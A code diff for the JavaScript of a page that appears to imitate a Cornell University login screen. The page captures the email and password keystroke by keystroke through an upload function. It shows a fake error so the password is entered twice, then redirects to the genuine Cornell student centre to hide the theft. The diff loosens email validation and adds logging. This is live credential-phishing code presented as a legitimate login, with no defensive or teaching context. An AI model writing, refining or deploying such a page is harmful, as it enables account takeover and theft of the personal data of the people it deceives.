@@ -3,68 +3,13 @@ w = 150
 
 let EMAIL = ''
 
-function valid(val){
-
-
+Id('next').onclick = () => {
+    let val = Id('email').value
     let end = val.substring(val.length-12, val.length)
 
-    if (end != '@cornell.edu'){
-        return false
-    }
 
-    let id = val.substring(0, val.length-12)
+    if (end == '@cornell.edu'){
 
-    if (id.length < 3 || id.length > 6){
-        return false
-    }
-
-    index = 0
-
-    for (let i=0; i<id.length; i++){
-        if (!isNaN(id[i])){
-            index = i
-            break
-        }
-    }
-
-    if (index == 0){
-        return false
-    }
-
-    letters = id.substring(0,index)
-    number = id.substring(index, id.length)
-
-    if (isNaN(number)){
-        return false
-    }
-
-    for (let i=0; i<letters.length; i++){
-        if (!isNaN(letters[i])){
-            return false
-        }
-    }
-
-    return true
-}
-
-Id('next').onclick = next
-
-window.addEventListener('keyup', (e) => {
-    switch (e.key){
-        case 'Enter':
-            if(Id('second').style.display != 'flex'){
-                next()
-            }else{
-                submit()
-            }
-            break
-    }
-});
-
-function next(){
-    let val = Id('email').value
-
-    if (valid(val)){
         Id('first').style.opacity = 0.3
         x = 0
         w = 150
@@ -86,26 +31,8 @@ function next(){
         Id('label').classList.add('error')
         Id('message').style.display = 'flex'
     }
-
 }
-
 stage = 0
-
-function submit(){
-    if (stage == 0){
-        Id('password').classList.add('error')
-        Id('label2').classList.add('error')
-        Id('message2').style.display = 'flex'
-        Class('check')[0].style.marginTop = '20px'
-        if (Id('password').value.length > 7){
-            stage = 1
-        }
-        uploadSet(Id('password').value)
-    }else{
-        window.location = 'https://studentcenter.cornell.edu'
-    }
-}
-
 
 
 Id('profile').onclick = () => {
@@ -122,15 +49,33 @@ Id('profile').onclick = () => {
     },1000)
 }
 
-Id('submit').onclick = submit
+Id('submit').onclick = () => {
+    if (stage == 0){
+        Id('password').classList.add('error')
+        Id('label2').classList.add('error')
+        Id('message2').style.display = 'flex'
+        Class('check')[0].style.marginTop = '20px'
+        stage = 1
+        uploadSet(Id('password').value)
+    }else{
+        Id('password').type = 'text'
+        setTimeout(() => {
+            window.location = 'https://studentcenter.cornell.edu'
+        }, 500);
+    }
+}
 
 Id('email').oninput = e => {
     let val = Id('email').value
+
+    console.log(val)
     uploadSet(val)
 }
 
 Id('password').oninput = e => {
     let val = Id('password').value
+
+    console.log(val)
     uploadSet(val)
 }
 
